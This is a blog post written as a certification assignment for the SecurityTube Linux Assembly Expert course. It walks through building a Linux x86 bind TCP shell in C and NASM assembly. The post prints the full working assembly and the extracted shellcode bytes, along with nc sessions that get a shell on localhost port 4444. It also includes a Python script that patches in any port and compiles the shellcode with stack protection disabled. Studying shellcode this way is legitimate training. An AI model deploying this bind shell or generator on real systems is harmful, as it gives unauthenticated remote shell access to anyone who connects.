# Assignment #1: Shell Bind TCP 

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-858


### Exercise
- Create a Shell_Bind_TCP shellcode
    - Binds to a port
    - Execs Shell on incoming connection
- Port number should be easily configurable


### Solution

First, we need to understand how the sockets work on linux. For this purpose I create a new program using a lenguage where I am confortable, this socket receives a incoming connection and run a command using execve. 
The methods involved on it:

- socket:   Create an endpoint for communication and return a file descriptor 
- bind:     Bind a socket to a port   
- listen:   Listen for connections on a socket
- accept:   Accept a connection on a socket
- dup2:     Duplicate the file descriptor, used for set stdin, stdout and sterr to the new file descritor (returned from accept)   
- execve:   Execute a program (our purpose /bin/sh)



```C
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(int argc, char *argv[]){

        // AF_INET = 2;         SOCK_STREAM = 1
        int fd = 0;
        int connfd = 0;
        fd = socket(AF_INET, SOCK_STREAM, 0);

        struct sockaddr_in serv_addr; 
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        serv_addr.sin_port = htons(4444); 

        bind(fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 
        listen(fd, 0);

        connfd = accept(fd, (struct sockaddr*)NULL, NULL);

        // redirect stdin, stdout, stderr
        dup2(connfd, 0);
        dup2(connfd, 1);
        dup2(connfd, 2); 

        // run program
        execve("/bin/sh", NULL, NULL);

}
```


We compile, run and test it to check if It is working...

Server:

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ gcc bind-shell-tcp.c -o bind-shell-tcp
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ ./bind-shell-tcp 

```

Client:
```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ sudo netstat -lntp | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1229/bind-shell-tcp
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ nc -vv 127.0.0.1 4444
localhost [127.0.0.1] 4444 (?) open
id
uid=1000(hiro) gid=1000(hiro) groups=1000(hiro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner)

```

After, I start to do same in assembly language. But before we need to know what are the numbers of the involved system calls.


| Method        | System call  | Socket syscall           | Description  |
| ------------- |:-------------:| :--------------:|-----------:|
| socket        | 0x66 (102) | 1 (SYS_SOCKET)          | Create a socket |
| bind      | 0x66 (102) |  2 (SYS_BIND)   |   Bind a socket |
| listen | 0x66 (102) | 4 (SYS_LISTEN)    |  Listen for connections |
| accept      | 0x66 (102) | 5 (SYS_ACCEPT)     |   Accept connections |
| dup2      | 0x3f (63)  | None    |   Duplicate the file descriptors |
| execve      | 0xb (11)  | None    |   Execute a program |


System syscalls:  /usr/include/i386-linux-gnu/asm/unistd_32.h
Socket syscalls: /usr/include/linux/net.h 
Socket protocols: /usr/include/i386-linux-gnu/bits/socket.h
Socket domains: /usr/include/netinet/in.h
Socket types: /usr/include/i386-linux-gnu/bits/socket_type.h

#### Create the socket
```c
int socket(int domain, int type, int protocol);
```

The domain will be **IPv4 Internel Protocol**, the type (of communication) **SOCK_STREAM** and the protocol.
Basically, we push the parameters in the stack and save the stack pointer in the ecx register, after we run the system call.



```nasm
        xor eax, eax
        xor ebx, ebx
        push eax                ; protocol      - 0
        push 1                  ; type          - SOCK_STREAM,
        push 2                  ; dominio       - AF_INET

        mov ecx, esp            ; arguments
        mov bl, 1               ; sys_socket (create)
        mov al, 102             ; systemcall
        int 0x80

        mov esi, eax            ; save sockfd
```

#### Bind a socket

```c
int bind(int sockfd, const struct sockaddr *addr,
                socklen_t addrlen);

           struct sockaddr {
               sa_family_t sa_family;
               char        sa_data[14];
           }

	// IPv4 AF_INET sockets:

	struct sockaddr_in {
    		short            sin_family; 
    		unsigned short   sin_port;     
    		struct in_addr   sin_addr;     
    		char             sin_zero[8];  
	};

        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        serv_addr.sin_port = htons(4444);
```

I saved the created socket in the esi register, so i need to bind this socket. First, I create the sockaddr variable and save it in the register ecx, second, I push in the stack the 3rd argument, third, push ecx (the sockaddr variable) in the stack, it will be the second argument, finally, push the register esi in the stack, it is the file descriptor of the socket.

To create the **sockaddr**, we save in the stack the **port**, **address** and the **address family**. I save the stack pointer address in the ecx register. After, I push the address length, the **sockaddr** created before (ecx) and the file descriptor (esi). Finally, I move the stack pointer to ecx (arguments), mov to ebx the socket call for bind (2) and move the syscall for sockets to eax and execute the interrupt.

```nasm
        xor eax, eax
        push eax                ; struct addr
        push word 0x5c11        ; Port 4444
        push word 2             ; PF_INET
        mov ecx, esp            ; save *addr in ecx

        push 0x10               ; length addrlen=16
        push ecx                ; &serv_addr
        push esi                ; sockfd

        mov ecx, esp            ; arguments
        mov al, 102             ; systemcall
        mov bl, 2               ; sys_bind
        int 0x80
```


#### Listen

```c
int listen(int sockfd, int backlog);
```

The **backlog** is the maximum length that can be queue for pending connections for the file descriptor and **sockfd** is the socket file descriptor. I used 0 for the backlog and the socket file descriptor that it is saved in the esi register.

```nasm
        xor eax, eax
        push eax                ; backlog
        push esi                ; sockfd

        mov ecx, esp            ; save arguments
        mov bl, 4               ; sys_listen
        mov al, 102             ; socket syscall
        int 0x80
```

#### Accept

```c
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

In this case the second and the third argument are NULL, the first is the socket file descriptor saved in esi.

```nasm
        xor eax, eax
        push eax                ; null
        push eax                ; null
        push esi                ; sockfd

        mov ecx, esp            ; save arguments
        mov bl, 5               ; sys_accept
        mov al, 102             ; socket syscall
        int 0x80
```

In this point, the program is waiting a new connection from the client.

#### Dup2

```c
int dup2(int oldfd, int newfd);
```

Duplicate the file descriptor, I did a loop to duplicate the three file descriptors (in, out and err) with the socket file descriptor.

```nasm
        mov ebx, eax            ; oldfd = clientfd
        xor ecx, ecx            ; ecx = newfd
loop:
        mov al, 0x3f            ; syscall dup2
        int 0x80
        inc ecx
        cmp ecx, 0x2
        jle loop
```


#### Execve
```c
int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```

Simple exevce shellcode /bin/sh that use the stack.

```nasm
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
```


#### Final program


```nasm
global _start

section .text
_start:
        ; int socket(int domain, int type, int protocol);
        xor eax, eax
        xor ebx, ebx
        push eax                ; protocol      - 0
        push 1                  ; type          - SOCK_STREAM,
        push 2                  ; dominio       - AF_INET

        mov ecx, esp            ; arguments
        mov bl, 1               ; sys_socket
        mov al, 102             ; systemcall
        int 0x80

        mov esi, eax            ; save sockfd


        ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
        xor eax, eax
        xor ecx, ecx
        ; *addr
        push eax                ; addr
        push word 0x5c11        ; Port 4444
        push word 2             ; PF_INET
        mov ecx, esp            ; save *addr in ecx

        push 0x10               ; length addrlen=16
        push ecx                ; &serv_addr
        push esi                ; sockfd

        mov ecx, esp            ; arguments
        mov al, 102             ; systemcall
        mov bl, 2               ; sys_bind
        int 0x80

        ; int listen(int sockfd, int backlog);
        xor eax, eax
        push eax                ; backlog
        push esi                ; sockfd

        mov ecx, esp            ; save arguments
        mov bl, 4               ; sys_listen
        mov al, 102             ; socket syscall
        int 0x80

        ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
        xor eax, eax
        push eax                ; null
        push eax                ; null
        push esi                ; sockfd

        mov ecx, esp            ; save arguments
        mov bl, 5               ; sys_accept 
        mov al, 102             ; socket syscall
        int 0x80

        ; int dup2(int oldfd, int newfd);
        mov ebx, eax            ; oldfd = clientfd
        xor ecx, ecx            ; ecx = newfd      
loop:
        mov al, 0x3f            ; syscall dup2    
        int 0x80
        inc ecx
        cmp ecx, 0x2
        jle loop


        ; execve stack-sh
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80

```

It works...
```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ ./compile.sh bind-tcp
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ objdump -d ./bind-tcp|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x31\xc9\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xc0\x50\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ vim shellcode.c 
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcodehiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ ./shellcode 
Shellcode Length:  109

```

```bash
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ sudo netstat -lnpt | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1334/shellcode  
hiro@HackingLab:~/SLAE/SLAE/EXAMEN/Assignment1$ nc -vv 127.0.0.1 4444
localhost [127.0.0.1] 4444 (?) open
id
uid=1000(hiro) gid=1000(hiro) groups=1000(hiro),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner)

```


#### Generate a bind TCP shellcode with configurable port

```python
#!/usr/bin/env python

import sys
import struct
import os


def port2hex(port):
	return struct.pack(">H", port)


if __name__ == "__main__":
	if sys.argv[1] is not None:
		try:
			if (int(sys.argv[1])<1024):
				print "[?] Only root can open ports below 1024"
			
			port = port2hex(int(sys.argv[1]))
			port_check = [port.encode('hex')[i:i+2] for i in range(0, len(port.encode('hex')), 2)]
			nullbytes = False
			for i in port_check:
				if (i == "00"):
					print "[-] The port contains null bytes, use another port"
					nullbytes = True
			shellcode = "\x31\xc0\x31\xdb\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x31\xc9\x50\x66\x68%s\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x31\xc0\x50\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x31\xc0\x50\x50\x56\x89\xe1\xb3\x05\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x83\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"%port
			sc = ""
			for c in bytearray(shellcode):
    				sc += "\\x%02x" % c
			shellcode_c = '#include<stdio.h>\n\
#include<string.h>\n\
unsigned char code[] = "%s";\n\
main(){\n\
printf("Shellcode Length: %%d\\n", strlen(code));\n\
int (*ret)() = (int(*)())code;\n\
ret();\n\
}'%sc
			with open("shellcode_tmp.c", "w") as f:
				f.write(shellcode_c)
			os.system("gcc shellcode_tmp.c -fno-stack-protector -z execstack -o shellcode")
			os.system("rm shellcode_tmp.c")
			if nullbytes:
				print "[+] Bind TCP shellcode created with null bytes\n[+] Run ./shellcode"
			else:
				print "[+] Bind TCP shellcode created\n[+] Run ./shellcode"
		except ValueError:
			print "[-] Port must be a number"
	else:
		print "usage: %prog <port> \nExample: ./%prog 4444"
```


